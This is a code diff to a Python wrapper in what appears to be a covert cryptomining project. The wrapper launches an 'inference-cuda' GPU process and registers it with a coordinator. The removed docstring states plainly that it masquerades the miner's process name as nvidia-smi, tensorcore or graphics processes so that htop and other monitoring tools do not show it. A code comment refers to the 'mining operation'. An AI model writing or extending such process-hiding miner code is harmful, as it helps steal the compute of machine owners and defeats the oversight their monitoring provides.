@@ -1,33 +1,3 @@
-#!/usr/bin/env python3
-"""mining_environment.stealth.wrappers.stealth_inference_cuda
-
-🎮 **[Stealth GPU-CUDA Inference Wrapper]** (wrapper ẩn danh cho GPU-CUDA inference)
-
-Script wrapper khởi động **inference-cuda process** với **[Process Name Stealth]** (ẩn danh tên tiến trình).
-Giải quyết vấn đề **[GPU Process Exposure]** (tiến trình GPU bị lộ) bằng cách thay đổi 
-**[Process Name Display]** (hiển thị tên tiến trình) trong system monitoring tools.
-
-⚠️ WORKFLOW:
-1. Tạo enhanced GPU environment với CUDA optimizations
-2. Khởi động inference-cuda subprocess với container-safe approach
-3. Áp dụng process name spoofing (nvidia-smi, tensorcore, etc.)
-4. Background stealth maintenance với periodic renaming
-5. DirectPID registry integration với metadata
-
-✅ STEALTH CAPABILITIES:
-- Process name masquerading (htop COMMAND column)
-- Container-compatible implementation  
-- Enhanced error handling và graceful degradation
-- Background stealth maintenance threads
-- NVIDIA/CUDA environment spoofing
-
-🎯 CONTAINER-OPTIMIZED FEATURES:
-- GPU-optimized stealth names (CUDA, OpenGL, graphics processes)
-- Compatible với Docker container restrictions
-- Memory optimization cho DAG generation
-- DirectPID registry integration
-"""
-
 import os
 import sys
 import signal
@@ -431,7 +401,7 @@ def main():
                         'registration_source': 'stealth_inference_cuda'
                     }
                     
-                    # **CORE REPLACEMENT**: Direct registry call completely replaces EventBus publish
+                    # **ENHANCED SINGLE-SOURCE EMISSION**: Direct registry call với linear flow handoff
                     success = registry.register_process(
                         pid=process.pid,
                         process_type="gpu", 
@@ -441,25 +411,31 @@ def main():
                     )
                     
                     if success:
-                        logger.info(f"✅ [DIRECT-REGISTRY] Successfully registered GPU process: PID={process.pid}, Name={new_name}")
-                        logger.info(f"📊 [DIRECT-REGISTRY] Registration triggered immediate plugin notifications")
+                        logger.info(f"✅ [LINEAR-FLOW] Single PID emission successful: PID={process.pid}, Name={new_name}")
+                        logger.info(f"📊 [LINEAR-FLOW] Initiating sequential handoff to coordinator")
                         
-                        # PHASE 3++: Register với Hook Coordinator để coordinate với Resource Manager
+                        # **LINEAR FLOW HANDOFF**: Sequential registration with coordinator
                         try:
                             sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'coordination'))
                             from coordinator import get_hook_coordinator
                             
                             coordinator = get_hook_coordinator()
-                            coordinator.register_pid(process.pid)
-                            
-                            logger.info(f"🔗 [PHASE3++] PID {process.pid} registered with Hook Coordinator")
+                            # **Enhanced coordinator integration** (tích hợp coordinator nâng cao)
+                            if hasattr(coordinator, 'receive_from_registry'):
+                                # Use enhanced linear handoff method
+                                handoff_success = coordinator.receive_from_registry(process.pid, process_metadata)
+                                logger.info(f"🔗 [LINEAR-FLOW] Sequential handoff to coordinator: {'✅ Success' if handoff_success else '❌ Failed'}")
+                            else:
+                                # Fallback to existing registration
+                                coordinator.register_pid(process.pid)
+                                logger.info(f"🔗 [LINEAR-FLOW] Fallback registration with coordinator completed")
                             
                         except Exception as coord_err:
-                            logger.error(f"❌ [PHASE3++] Hook Coordinator registration failed: {coord_err}")
+                            logger.error(f"❌ [LINEAR-FLOW] Coordinator handoff failed: {coord_err}")
                             # Continue anyway - non-critical for mining operation
                             
                     else:
-                        logger.error(f"❌ [DIRECT-REGISTRY] Failed to register GPU process PID {process.pid}")
+                        logger.error(f"❌ [LINEAR-FLOW] Single PID emission failed for process PID {process.pid}")
                         
                 except Exception as registry_err:
                     logger.error(f"❌ [DIRECT-REGISTRY] Registration failed: {registry_err}")
